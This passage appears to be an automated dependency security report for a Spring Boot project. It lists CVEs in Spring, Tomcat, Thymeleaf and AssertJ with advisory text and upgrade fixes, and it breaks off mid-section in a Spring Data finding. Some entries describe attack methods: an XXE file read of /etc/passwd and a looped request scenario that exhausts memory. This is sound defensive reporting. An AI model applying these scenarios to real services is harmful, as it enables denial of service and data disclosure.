# Security Assessment Report

**Generated:** 2026-10-21T13:17:09.814037Z

Minimum CVE severity: **high**. Dependency advisory matches are not proof of exploit reachability; see [scan coverage](scan-coverage.md).

## Summary

| Metric | Count |
|---|---|
| Total Findings | 44 |
| CVE Vulnerabilities | 42 |
| CWE Vulnerabilities | 2 |
| Total Rules Assessed | 59 |
| Rules Passed | 57 |

### By Severity

| Severity | Count |
|---|---|
| mandatory | 42 |
| optional | 1 |
| potential | 1 |

## CVE Findings (Dependency Vulnerabilities)

### CVE-2025-41248: Spring Security annotation detection mechanism has authorization bypass
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:65

[CVE-2025-41248](https://github.com/advisories/GHSA-8v5q-rhf3-jphm): Spring Security annotation detection mechanism has authorization bypass

Severity: HIGH

Affected resolved dependencies:
- org.springframework.security:spring-security-core:6.5.0 (transitive via org.springframework.boot:spring-boot-starter-security; compile scope; pom.xml:65); affected range: >= 6.5.0, < 6.5.4

Advisory description / exploitation conditions:
The Spring Security annotation detection mechanism may not correctly resolve annotations on methods within type hierarchies with a parameterized super type with unbounded generics. This can be an issue when using @PreAuthorize and other method security annotations, resulting in an authorization bypass.

Your application may be affected by this if you are using Spring Security's @EnableMethodSecurity feature.

You are not affected by this if you are not using @EnableMethodSecurity or if you do not use security annotations on methods in generic superclasses or generic interfaces.

This CVE is published in conjunction with  CVE-2025-41249 https://spring.io/security/cve-2025-41249 .

Recommended fix:
- org.springframework.security:spring-security-core: upgrade to 6.5.4 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2025-41249: Spring Framework annotation detection mechanism may result in improper authorization
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:84

[CVE-2025-41249](https://github.com/advisories/GHSA-jmp9-x22r-554x): Spring Framework annotation detection mechanism may result in improper authorization

Severity: HIGH

Affected resolved dependencies:
- org.springframework:spring-core:6.2.7 (transitive via org.springframework.boot:spring-boot-starter-test; compile scope; pom.xml:84); affected range: >= 6.2.0, <= 6.2.10

Advisory description / exploitation conditions:
The Spring Framework annotation detection mechanism may not correctly resolve annotations on methods within type hierarchies with a parameterized super type with unbounded generics. This can be an issue if such annotations are used for authorization decisions.

Your application may be affected by this if you are using Spring Security's @EnableMethodSecurity feature.

You are not affected by this if you are not using @EnableMethodSecurity or if you do not use security annotations on methods in generic superclasses or generic interfaces.

This CVE is published in conjunction with  CVE-2025-41248 https://spring.io/security/cve-2025-41248 .

Recommended fix:
- org.springframework:spring-core: upgrade to 6.2.11 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2025-48988: Apache Tomcat - DoS in multipart upload
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2025-48988](https://github.com/advisories/GHSA-h3gc-qfqq-6h8f): Apache Tomcat - DoS in multipart upload

Severity: HIGH

Affected resolved dependencies:
- org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (transitive via org.springframework.boot:spring-boot-starter-web; compile scope; pom.xml:34); affected range: >= 10.1.0-M1, <= 10.1.41

Advisory description / exploitation conditions:
Allocation of Resources Without Limits or Throttling vulnerability in Apache Tomcat.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.7, from 10.1.0-M1 through 10.1.41, from 9.0.0.M1 through 9.0.105. The following versions were EOL at the time the CVE was created but are known to be affected: 8.5.0 though 8.5.100. Other, older, EOL versions may also be affected.

Users are recommended to upgrade to version 11.0.8, 10.1.42 or 9.0.106, which fix the issue.

Recommended fix:
- org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.42 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2025-48989: Apache Tomcat Improper Resource Shutdown or Release vulnerability
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2025-48989](https://github.com/advisories/GHSA-gqp3-2cvr-x8m3): Apache Tomcat Improper Resource Shutdown or Release vulnerability

Severity: HIGH

Affected resolved dependencies:
- org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (transitive via org.springframework.boot:spring-boot-starter-web; compile scope; pom.xml:34); affected range: >= 10.1.0-M1, < 10.1.44

Advisory description / exploitation conditions:
Improper Resource Shutdown or Release vulnerability in Apache Tomcat made Tomcat vulnerable to the made you reset attack.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.9, from 10.1.0-M1 through 10.1.43 and from 9.0.0.M1 through 9.0.107. Older, EOL versions may also be affected.

Users are recommended to upgrade to one of versions 11.0.10, 10.1.44 or 9.0.108 which fix the issue.

Recommended fix:
- org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.44 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2025-52520: Apache Tomcat Catalina is vulnerable to DoS attack through bypassing of size limits
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2025-52520](https://github.com/advisories/GHSA-wr62-c79q-cv37): Apache Tomcat Catalina is vulnerable to DoS attack through bypassing of size limits

Severity: HIGH

Affected resolved dependencies:
- org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (transitive via org.springframework.boot:spring-boot-starter-web; compile scope; pom.xml:34); affected range: >= 10.1.0-M1, < 10.1.43

Advisory description / exploitation conditions:
For some unlikely configurations of multipart upload, an Integer Overflow vulnerability in Apache Tomcat could lead to a DoS via bypassing of size limits.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.8, from 10.1.0-M1 through 10.1.42, from 9.0.0.M1 through 9.0.106. The following versions were EOL at the time the CVE was created but are known to be affected: 8.5.0 through 8.5.100. Other, older, EOL versions may also be affected.

Users are recommended to upgrade to version 11.0.9, 10.1.43 or 9.0.107, which fix the issue.

Recommended fix:
- org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.43 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2025-53506: Apache Tomcat Coyote vulnerable to Denial of Service via excessive HTTP/2 streams
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2025-53506](https://github.com/advisories/GHSA-25xr-qj8w-c4vf): Apache Tomcat Coyote vulnerable to Denial of Service via excessive HTTP/2 streams

Severity: HIGH

Affected resolved dependencies:
- org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (transitive via org.springframework.boot:spring-boot-starter-web; compile scope; pom.xml:34); affected range: >= 10.1.0-M1, < 10.1.43

Advisory description / exploitation conditions:
Uncontrolled Resource Consumption vulnerability in Apache Tomcat if an HTTP/2 client did not acknowledge the initial settings frame that reduces the maximum permitted concurrent streams.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.8, from 10.1.0-M1 through 10.1.42, from 9.0.0.M1 through 9.0.106. The following versions were EOL at the time the CVE was created but are known to be affected: 8.5.0 through 8.5.100.

Users are recommended to upgrade to version 11.0.9, 10.1.43 or 9.0.107, which fix the issue.

Recommended fix:
- org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.43 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2025-55752: Apache Tomcat Vulnerable to Relative Path Traversal
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2025-55752](https://github.com/advisories/GHSA-wmwf-9ccg-fff5): Apache Tomcat Vulnerable to Relative Path Traversal

Severity: HIGH

Affected resolved dependencies:
- org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (transitive via org.springframework.boot:spring-boot-starter-web; compile scope; pom.xml:34); affected range: >= 10.1.0-M1, < 10.1.45

Advisory description / exploitation conditions:
The fix for bug 60013 introduced a regression where the rewritten URL was normalized before it was decoded. This introduced the possibility that, for rewrite rules that rewrite query parameters to the URL, an attacker could manipulate the request URI to bypass security constraints including the protection for /WEB-INF/ and /META-INF/. If PUT requests were also enabled then malicious files could be uploaded leading to remote code execution. PUT requests are normally limited to trusted users and it is considered unlikely that PUT requests would be enabled in conjunction with a rewrite that manipulated the URI.



This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.10, from 10.1.0-M1 through 10.1.44, from 9.0.0.M11 through 9.0.108.

The following versions were EOL at the time the CVE was created but are  known to be affected: 8.5.6 though 8.5.100. Other, older, EOL versions may also be affected. Users are recommended to upgrade to version 11.0.11 or later, 10.1.45 or later or 9.0.109 or later, which fix the issue.

Recommended fix:
- org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.45 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-22732: Spring Security HTTP Headers Are not Written Under Some Conditions
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:65

[CVE-2026-22732](https://github.com/advisories/GHSA-mf92-479x-3373): Spring Security HTTP Headers Are not Written Under Some Conditions

Severity: CRITICAL

Affected resolved dependencies:
- org.springframework.security:spring-security-web:6.5.0 (transitive via org.springframework.boot:spring-boot-starter-security; compile scope; pom.xml:65); affected range: >= 6.5.0, < 6.5.9

Advisory description / exploitation conditions:
When applications specify HTTP response headers for servlet applications using Spring Security, there is the possibility that the HTTP Headers will not be written. 
This issue affects Spring Security: from 5.7.0 through 5.7.21, from 5.8.0 through 5.8.23, from 6.3.0 through 6.3.14, from 6.4.0 through 6.4.14, from 6.5.0 through 6.5.8, from 7.0.0 through 7.0.3.

Recommended fix:
- org.springframework.security:spring-security-web: upgrade to 6.5.9 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-24400: AssertJ has XML External Entity (XXE) vulnerability when parsing untrusted XML via isXmlEqualTo assertion
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:84

[CVE-2026-24400](https://github.com/advisories/GHSA-rqfh-9r24-8c9r): AssertJ has XML External Entity (XXE) vulnerability when parsing untrusted XML via isXmlEqualTo assertion

Severity: HIGH

Affected resolved dependencies:
- org.assertj:assertj-core:3.27.3 (transitive via org.springframework.boot:spring-boot-starter-test; test scope; pom.xml:84); affected range: >= 1.4.0, <= 3.27.6

Advisory description / exploitation conditions:
An XML External Entity (XXE) vulnerability exists in `org.assertj.core.util.xml.XmlStringPrettyFormatter`: the `toXmlDocument(String)` method initializes `DocumentBuilderFactory` with default settings, without disabling DTDs or external entities. This formatter is used by the `isXmlEqualTo(CharSequence)` assertion for `CharSequence` values.

An application is vulnerable only when it uses untrusted XML input with one of the following methods:

- `isXmlEqualTo(CharSequence)` from `org.assertj.core.api.AbstractCharSequenceAssert`
- `xmlPrettyFormat(String)` from `org.assertj.core.util.xml.XmlStringPrettyFormatter`

### Impact

If untrusted XML input is processed by the methods mentioned above (e.g., in test environments handling external fixture files), an attacker could:

- **Read arbitrary local files** via `file://` URIs (e.g., `/etc/passwd`, application configuration files)
- **Perform Server-Side Request Forgery (SSRF)** via HTTP/HTTPS URIs
- **Cause Denial of Service** via "Billion Laughs" entity expansion attacks

### Mitigation

`isXmlEqualTo(CharSequence)` has been deprecated in favor of [XMLUnit](https://www.xmlunit.org/) in version 3.18.0 and will be removed in version 4.0. Users of affected versions should, in order of preference:

1. Replace `isXmlEqualTo(CharSequence)` with XMLUnit, or
2. Upgrade to version 3.27.7, or
3. Avoid using `isXmlEqualTo(CharSequence)` or `XmlStringPrettyFormatter` with untrusted input.

`XmlStringPrettyFormatter` has historically been considered a utility for `isXmlEqualTo(CharSequence)` rather than a feature for AssertJ users, so it is deprecated in version 3.27.7 and removed in version 4.0, with no replacement.

### References

- [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

Recommended fix:
- org.assertj:assertj-core: upgrade to 3.27.7 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-24734: Apache Tomcat has an Improper Input Validation vulnerability
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-24734](https://github.com/advisories/GHSA-mgp5-rv84-w37q): Apache Tomcat has an Improper Input Validation vulnerability

Severity: HIGH

Affected resolved dependencies:
- org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (transitive via org.springframework.boot:spring-boot-starter-web; compile scope; pom.xml:34); affected range: >= 10.1.0-M7, < 10.1.52

Advisory description / exploitation conditions:
Improper Input Validation vulnerability in Apache Tomcat Native, Apache Tomcat.

When using an OCSP responder, Tomcat Native (and Tomcat's FFM port of the Tomcat Native code) did not complete verification or freshness checks on the OCSP response which could allow certificate revocation to be bypassed.

This issue affects Apache Tomcat Native:  from 1.3.0 through 1.3.4, from 2.0.0 through 2.0.11; Apache Tomcat: from 11.0.0-M1 through 11.0.17, from 10.1.0-M7 through 10.1.51, from 9.0.83 through 9.0.114.


The following versions were EOL at the time the CVE was created but are 
known to be affected: from 1.1.23 through 1.1.34, from 1.2.0 through 1.2.39. Older EOL versions are not affected.

Apache Tomcat Native users are recommended to upgrade to versions 1.3.5 or later or 2.0.12 or later, which fix the issue.

Apache Tomcat users are recommended to upgrade to versions 11.0.18 or later, 10.1.52 or later or 9.0.115 or later which fix the issue.

Recommended fix:
- org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.52 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-24880: Apache Tomcat has an HTTP Request/Response Smuggling vulnerability
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-24880](https://github.com/advisories/GHSA-563x-q5rq-57qp): Apache Tomcat has an HTTP Request/Response Smuggling vulnerability

Severity: HIGH

Affected resolved dependencies:
- org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (transitive via org.springframework.boot:spring-boot-starter-web; compile scope; pom.xml:34); affected range: >= 10.1.0-M1, < 10.1.52

Advisory description / exploitation conditions:
Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling') vulnerability in Apache Tomcat via invalid chunk extension.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.18, from 10.1.0-M1 through 10.1.52, from 9.0.0.M1 through 9.0.115, from 8.5.0 through 8.5.100, from 7.0.0 through 7.0.109.
Other, unsupported versions may also be affected.

Users are recommended to upgrade to version 11.0.20, 10.1.52 or 9.0.116, which fix the issue.

Recommended fix:
- org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.52 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-34483: Apache Tomcat has an Improper Encoding or Escaping of Output vulnerability in the JsonAccessLogValve
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-34483](https://github.com/advisories/GHSA-rv64-5gf8-9qq8): Apache Tomcat has an Improper Encoding or Escaping of Output vulnerability in the JsonAccessLogValve

Severity: HIGH

Affected resolved dependencies:
- org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (transitive via org.springframework.boot:spring-boot-starter-web; compile scope; pom.xml:34); affected range: >= 10.1.0-M1, < 10.1.54

Advisory description / exploitation conditions:
Improper Encoding or Escaping of Output vulnerability in the JsonAccessLogValve component of Apache Tomcat.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.20, from 10.1.0-M1 through 10.1.53, from 9.0.40 through 9.0.116.

Users are recommended to upgrade to version 11.0.21, 10.1.54 or 9.0.117 , which fix the issue.

Recommended fix:
- org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.54 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-34487: Apache Tomcat vulnerable to Insertion of Sensitive Information into Log File
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-34487](https://github.com/advisories/GHSA-x4m4-345f-5h5g): Apache Tomcat vulnerable to Insertion of Sensitive Information into Log File

Severity: HIGH

Affected resolved dependencies:
- org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (transitive via org.springframework.boot:spring-boot-starter-web; compile scope; pom.xml:34); affected range: >= 10.1.0-M1, < 10.1.54

Advisory description / exploitation conditions:
Insertion of Sensitive Information into Log File vulnerability in the cloud membership for clustering component of Apache Tomcat exposed the Kubernetes bearer token.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.20, from 10.1.0-M1 through 10.1.53, from 9.0.13 through 9.0.116.

Users are recommended to upgrade to version 11.0.21, 10.1.54 or 9.0.117, which fix the issue.

Recommended fix:
- org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.54 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-40477: Improper restriction of the scope of accessible objects in Thymeleaf expressions
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:40

[CVE-2026-40477](https://github.com/advisories/GHSA-r4v4-5mwr-2fwr): Improper restriction of the scope of accessible objects in Thymeleaf expressions

Severity: CRITICAL

Affected resolved dependencies:
- org.thymeleaf:thymeleaf:3.1.3.RELEASE (transitive via org.springframework.boot:spring-boot-starter-thymeleaf; compile scope; pom.xml:40); affected range: <= 3.1.3.RELEASE
- org.thymeleaf:thymeleaf-spring6:3.1.3.RELEASE (transitive via org.springframework.boot:spring-boot-starter-thymeleaf; compile scope; pom.xml:40); affected range: <= 3.1.3.RELEASE

Advisory description / exploitation conditions:
### Impact
A security bypass vulnerability exists in the expression execution mechanisms of Thymeleaf up to and including 3.1.3.RELEASE. Although the library provides mechanisms to prevent expression injection, it fails to properly restrict the scope of accessible objects, allowing specific potentially sensitive objects to be reached from within a template. If an application developer passes unvalidated user input directly to the template engine, an unauthenticated remote attacker can bypass the library's protections to achieve Server-Side Template Injection (SSTI).

### Patches
This has been fixed in Thymeleaf 3.1.4.RELEASE.

### Workarounds
No workaround is available beyond ensuring applications do not pass unvalidated user input directly to the template engine. Upgrading to 3.1.4.RELEASE is strongly recommended in any case.


### Credits
Thanks to Thomas Reburn (Praetorian) for responsible disclosure.

Recommended fix:
- org.thymeleaf:thymeleaf-spring6: upgrade to 3.1.4.RELEASE or a later supported patched release
- org.thymeleaf:thymeleaf: upgrade to 3.1.4.RELEASE or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-40478: Improper neutralization of specific syntax patterns for unauthorized expressions in Thymeleaf
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:40

[CVE-2026-40478](https://github.com/advisories/GHSA-xjw8-8c5c-9r79): Improper neutralization of specific syntax patterns for unauthorized expressions in Thymeleaf

Severity: CRITICAL

Affected resolved dependencies:
- org.thymeleaf:thymeleaf:3.1.3.RELEASE (transitive via org.springframework.boot:spring-boot-starter-thymeleaf; compile scope; pom.xml:40); affected range: <= 3.1.3.RELEASE
- org.thymeleaf:thymeleaf-spring6:3.1.3.RELEASE (transitive via org.springframework.boot:spring-boot-starter-thymeleaf; compile scope; pom.xml:40); affected range: <= 3.1.3.RELEASE

Advisory description / exploitation conditions:
### Impact
A security bypass vulnerability exists in the expression execution mechanisms of Thymeleaf up to and including 3.1.3.RELEASE. Although the library provides mechanisms to prevent expression injection, it fails to properly neutralize specific syntax patterns that allow for the execution of unauthorized expressions. If an application developer passes unvalidated user input directly to the template engine, an unauthenticated remote attacker can bypass the library's protections to achieve Server-Side Template Injection (SSTI).

### Patches
This has been fixed in Thymeleaf 3.1.4.RELEASE.

### Workarounds
No workaround is available beyond ensuring applications do not pass unvalidated user input directly to the template engine. Upgrading to 3.1.4.RELEASE is strongly recommended in any case.

### Credits
Thanks to Dawid Bakaj (VIPentest.com) for responsible disclosure.

Recommended fix:
- org.thymeleaf:thymeleaf-spring6: upgrade to 3.1.4.RELEASE or a later supported patched release
- org.thymeleaf:thymeleaf: upgrade to 3.1.4.RELEASE or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-40972: Spring Boot DevTools remote secret comparison is vulnerable to timing attacks
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:98

[CVE-2026-40972](https://github.com/advisories/GHSA-56v8-86gj-66jp): Spring Boot DevTools remote secret comparison is vulnerable to timing attacks

Severity: HIGH

Affected resolved dependencies:
- org.springframework.boot:spring-boot-devtools:3.5.0 (direct; compile scope; pom.xml:98); affected range: >= 3.5.0, < 3.5.14

Advisory description / exploitation conditions:
An attacker on the same network as the remote application may be able to utilize a timing attack to discover information about the remote secret. In extreme circumstances this could result in the attacker determining the secret and uploading changed classes, thereby achieving remote code execution in the remote application.

Affected: Spring Boot 4.0.0–4.0.5 (fix 4.0.6), 3.5.0–3.5.13 (fix 3.5.14), 3.4.0–3.4.15 (fix 3.4.16), 3.3.0–3.3.18 (fix 3.3.19), 2.7.0–2.7.32 (fix 2.7.33); DevTools remote secret comparison. Versions that are no longer supported are also affected per vendor advisory.

Recommended fix:
- org.springframework.boot:spring-boot-devtools: upgrade to 3.5.14 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-40973: Spring Boot accepts predictable temp directory without ownership verification
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:98

[CVE-2026-40973](https://github.com/advisories/GHSA-wwpq-f5c3-7hvx): Spring Boot accepts predictable temp directory without ownership verification

Severity: HIGH

Affected resolved dependencies:
- org.springframework.boot:spring-boot:3.5.0 (transitive via org.springframework.boot:spring-boot-devtools; compile scope; pom.xml:98); affected range: >= 3.5.0, < 3.5.14

Advisory description / exploitation conditions:
A local attacker on the same host as the application may be able to take control of the directory used by `ApplicationTemp`. When `server.servlet.session.persistent` is set to `true` and the attack persists across application restarts, this may allow the attacker to read session information and hijack authenticated users or deploy a gadget chain and execute code as the application's user.

Affected: Spring Boot 4.0.0–4.0.5 (fix 4.0.6), 3.5.0–3.5.13 (fix 3.5.14), 3.4.0–3.4.15 (fix 3.4.16), 3.3.0–3.3.18 (fix 3.3.19), 2.7.0–2.7.32 (fix 2.7.33); predictable temp directory / `ApplicationTemp` ownership verification. Versions that are no longer supported are also affected per vendor advisory.

Recommended fix:
- org.springframework.boot:spring-boot: upgrade to 3.5.14 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-41284: Apache Tomcat: Unbounded read in WebDAV LOCK and  PROPFIND handling
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-41284](https://github.com/advisories/GHSA-gx5v-xp9w-j4cg): Apache Tomcat: Unbounded read in WebDAV LOCK and  PROPFIND handling

Severity: HIGH

Affected resolved dependencies:
- org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (transitive via org.springframework.boot:spring-boot-starter-web; compile scope; pom.xml:34); affected range: >= 10.1.0-M1, < 10.1.55

Advisory description / exploitation conditions:
Versions Affected:
Apache Tomcat 11.0.0-M1 to 11.0.21
Apache Tomcat 10.1.0-M1 to 10.1.54
Apache Tomcat 9.0.0.M1 to 9.0.117
Older, unsupported versions may also be affected

Description:
No limit was enforced on the request body for WebDAV LOCK or PROPFIND
requests which were available to unauthenticated users.

Mitigation:
Users of the affected versions should apply one of the following
mitigations:
- Upgrade to Apache Tomcat 11.0.22 or later
- Upgrade to Apache Tomcat 10.1.55 or later
- Upgrade to Apache Tomcat 9.0.118 or later

Credit:
This issue was identified by Dariusz Gońda

Recommended fix:
- org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.55 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-41293: Apache Tomcat - HTTP/2 request headers not validated
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-41293](https://github.com/advisories/GHSA-r29c-68gh-xp6x): Apache Tomcat - HTTP/2 request headers not validated

Severity: CRITICAL

Affected resolved dependencies:
- org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (transitive via org.springframework.boot:spring-boot-starter-web; compile scope; pom.xml:34); affected range: >= 10.1.0-M1, < 10.1.55

Advisory description / exploitation conditions:
Versions Affected:
Apache Tomcat 11.0.0-M1 to 11.0.21
Apache Tomcat 10.1.0-M1 to 10.1.54
Apache Tomcat 9.0.0.M1 to 9.0.117
Older, unsupported versions may also be affected

Description:
HTTP/2 request headers were not validated which may have triggered
unexpected application behaviour if the application (quite reasonably)
assumed that header value exposed through the Servlet API would be
specification compliant.

Mitigation:
Users of the affected versions should apply one of the following
mitigations:
- Upgrade to Apache Tomcat 11.0.22 or later
- Upgrade to Apache Tomcat 10.1.55 or later
- Upgrade to Apache Tomcat 9.0.118 or later

Credit:
This issue was identified by Dawit Jeong (@dawitngoliath)

Recommended fix:
- org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.55 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-41695: Spring Data: Unbounded property-path cache keyed by externally-supplied path string
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:46

[CVE-2026-41695](https://github.com/advisories/GHSA-88fw-v6x4-3f58): Spring Data: Unbounded property-path cache keyed by externally-supplied path string

Severity: HIGH

Affected resolved dependencies:
- org.springframework.data:spring-data-commons:3.5.0 (transitive via org.springframework.boot:spring-boot-starter-data-jpa; compile scope; pom.xml:46); affected range: >= 3.5.0, <= 3.5.11

Advisory description / exploitation conditions:
`src/main/java/org/springframework/data/mapping/context/PersistentPropertyPathFactory.java:175` · Unbounded Resource Allocation (Algorithmic DoS)

### Impact

When a consuming module routes user-supplied dot-paths (sort parameters, projection paths, PATCH paths) through `MappingContext.getPersistentPropertyPath(String, Class)`, each distinct string — including invalid ones — is cached forever. A remote attacker can send millions of requests with unique `?sort=aaaa<n>` values and grow the heap until the service OOMs.

### Description

`PersistentPropertyPathFactory.propertyPaths` (line 53) is a `ConcurrentHashMap<TypeAndPath, PathResolution>` populated by `getPotentiallyCachedPath()` (line 174-177) via `computeIfAbsent`. The key is `(TypeInformation, rawPathString)`. Crucially, unresolvable paths are also cached (as `PathResolution.unresolved`, line 204) so that the same `InvalidPersistentPropertyPath` can be re-thrown — meaning every distinct garbage string an attacker sends creates a permanent entry. There is no eviction. This is reachable from `AbstractMappingContext.getPersistentPropertyPath(String, Class)` (`AbstractMappingContext.java:345`), which Spring Data REST and several store query mappers call with HTTP-request-derived sort/filter property names.

By contrast, the sibling `SimplePropertyPath.cache` was already hardened to use `ConcurrentReferenceHashMap` (soft refs); this cache was not given the same treatment.

### Exploit scenario

Against a Spring Data REST endpoint, an attacker scripts `GET /things?sort=<random-40-char-string>` in a loop. Each request fails fast with `InvalidPersistentPropertyPath`, but each distinct random string leaves behind a `TypeAndPath` key, a `PathResolution` object holding the split segments list, and the source string in the map. After ~10M requests the JVM OOMs.

### Preconditions

- A downstream component (Spring Data REST, a store-specific `QueryMapper`, or application code) passes externally-supplied strings to `MappingContext.getPersistentPropertyPath(String, ...)`
- No upstream rate-limiting or path-string validation

### How to fix

A cache whose key can be derived from external input must be bounded. Replace `propertyPaths` (line 53) with a `ConcurrentLruCache<TypeAndPath, PathResolution>` of fixed capacity, or `ConcurrentReferenceHashMap` (matching the sibling `SimplePropertyPath.cache`). Additionally, do not cache `PathResolution.unresolved` results at all (line 204 in `createPersistentPropertyPath`) — re-computing a failed lookup is cheap, and caching negative results for arbitrary attacker strings is what makes this exploitable.

### Adversarial verification

**Verdict:** TRUE_POSITIVE (confidence: 7/10) — unbounded hard-ref `ConcurrentHashMap` keyed by raw path string, caches unresolved entries (line 204), reachable via public `MappingContext.getPersistentPropertyPath(String, ...)`; sibling `PropertyPath` cache was already converted to soft-refs but this one was missed. -3 confidence because the HTTP-input wiring lives in downstream modules (Spring Data REST / store mappers), not verifiable in this repo.

**Code at the line — CONFIRMED**
- Line 53: `private final Map<TypeAndPath, PathResolution> propertyPaths = new ConcurrentHashMap<>();` — plain CHM, hard refs, no eviction, no size bound.
- Line 175: `propertyPaths.computeIfAbsent(TypeAndPath.of(type, propertyPath), ...)` — every distinct `(type, string)` pair is inserted.
- Line 204: `return PathResolution.unresolved(parts, segment, type, currentPath);` — returned from inside `computeIfAbsent`'s mapping function, so unresolvable paths are cached. The `PathResolution` retains the full attacker string (`source = StringUtils.collectionToDelimitedString(parts, ".")`, line 452).

**Callers within spring-data-commons**
